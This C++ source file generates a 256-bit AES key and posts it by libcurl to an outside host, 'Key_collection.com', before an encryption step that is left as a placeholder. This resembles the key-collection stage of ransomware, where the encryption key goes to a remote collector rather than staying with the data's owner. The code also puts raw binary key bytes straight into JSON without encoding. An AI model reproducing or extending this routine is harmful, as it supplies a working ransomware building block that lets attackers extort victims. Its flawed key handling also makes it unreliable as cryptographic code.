#include "aesencr.h"
#include <iostream>
#include <cstring>
#include <fstream>

// Include the necessary libraries for networking and communication with Key_collection.com
#include <curl/curl.h>  // For making HTTP requests, using libcurl for example

int main() {
    // Initialize the AESEncryption object
    AESEncryption aes;

    // Data to be encrypted
    const char* data = "This is a test data of random events we can use";

    // Determine the length of the data
    size_t dataLength = std::strlen(data);

    // Generate a CSPRNG key
    unsigned char key[32];  // Choose the appropriate size (256-bit)
    aes.GenerateKey(key, sizeof(key));

    // Send the key to Key_collection.com using a secure API or communication method
    // Example code for sending the key to a hypothetical service via HTTP POST request:
    CURL* curl = curl_easy_init();
    if (curl) {
        std::string keyAsString(reinterpret_cast<char*>(key), sizeof(key));

        // Customize the URL, headers, and payload based on Key_collection.com's API
        std::string url = "https://Key_collection.com/api/keys";
        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");

        // Customize the payload as needed
        std::string payload = "{\"key\": \"" + keyAsString + "\"}";

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());

        CURLcode res = curl_easy_perform(curl);
        if (res == CURLE_OK) {
            std::cout << "Key sent to Key_collection.com successfully." << std::endl;
        } else {
            std::cerr << "Failed to send the key to Key_collection.com: " << curl_easy_strerror(res) << std::endl;
        }

        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    } else {
        std::cerr << "Failed to initialize libcurl." << std::endl;
    }

    // Continue with the encryption of data, if needed
    // ...

    return 0;
}
